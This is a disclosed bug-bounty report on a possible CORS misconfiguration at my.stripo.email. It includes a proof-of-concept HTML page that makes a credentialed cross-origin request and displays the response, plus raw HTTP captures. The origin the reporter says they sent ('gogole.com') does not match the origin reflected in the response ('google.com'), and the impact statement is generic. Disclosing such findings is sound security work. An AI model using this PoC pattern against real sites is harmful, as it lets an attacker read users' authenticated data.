# CORS on my.stripo.email

## Report Details
- **Report ID**: 859688
- **URL**: https://hackerone.com/reports/859688
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-04-26T14:00:34.052Z
- **Disclosed**: 2020-04-28T14:35:13.426Z

## Reporter
- **Username**: nihadp
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: stripo

## Vulnerability Information
Hey Team i don't know if it's valid or not i just want to let you know about this thanks.

following the HTML File ..

<html>
<script>
var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://my.stripo.email/cabinet/stripo-ws/v1/stripo-websocket/info?t=1587908666898',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
</script>
</html>

#the Request

`GET /cabinet/stripo-ws/v1/stripo-websocket/info?t=1587908666898 HTTP/1.1
Host: my.stripo.email
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://my.stripo.email/cabinet/`

#Response

HTTP/1.1 200 
Server: nginx
Date: Sun, 26 Apr 2020 13:57:50 GMT
Content-Type: application/json;charset=UTF-8
Connection: close
Vary: Accept-Encoding
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Cache-Control: no-store, no-cache, must-revalidate, max-age=0
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 77

{"entropy":750465027,"origins":["*:*"],"cookie_needed":true,"websocket":true}

After i added `origin: https://gogole.com` on __Request__ 

the #Resposne

`HTTP/1.1 200 
Server: nginx
Date: Sun, 26 Apr 2020 14:00:03 GMT
Content-Type: application/json;charset=UTF-8
Connection: close
Vary: Accept-Encoding
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: https://google.com
Access-Control-Allow-Credentials: true
Cache-Control: no-store, no-cache, must-revalidate, max-age=0
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 78

{"entropy":-717493192,"origins":["*:*"],"cookie_needed":true,"websocket":true}`

## Impact

As with superpowers, it’s all about knowing how to use it. Therefore, CORS is not necessarily a bad thing. We’ve seen in many cases that CORS has legitimate use, and this is why it was invented and made a web standard in the first place. However, you need to be aware of the CORS configuration you set up in your server and the side effects this has on security.

## Attachments
- w.html
